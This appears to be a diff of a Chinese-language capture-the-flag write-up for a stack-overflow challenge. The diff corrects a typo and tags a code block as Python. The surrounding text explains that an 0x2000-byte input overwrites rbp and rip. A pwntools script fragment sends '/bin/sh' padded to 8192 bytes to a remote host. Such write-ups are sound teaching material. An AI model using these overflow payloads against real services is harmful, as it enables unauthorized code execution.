@@ -17,7 +17,7 @@ Attachment: stackoverflow_withleak
 
 ![vul](./2018-09-28-22-57-45.png)
 
-构造一个 0x2000 长度的字符串之后，即可覆写 `rbp` 和 `rip` 。一开始尝试调转到 `doit` 函数：
+构造一个 0x2000 长度的字符串之后，即可覆写 `rbp` 和 `rip` 。一开始尝试跳转到 `doit` 函数：
 
 ![doit](2018-09-28-23-03-35.png)
 
@@ -25,7 +25,7 @@ Attachment: stackoverflow_withleak
 
 脚本（见 [pwn1.py](pwn1.py) ）如下：
 
-```
+```python
 from pwn import *
 r = remote(host, ip)
 r.send('/bin/sh\0'+'A'*(8192-8))
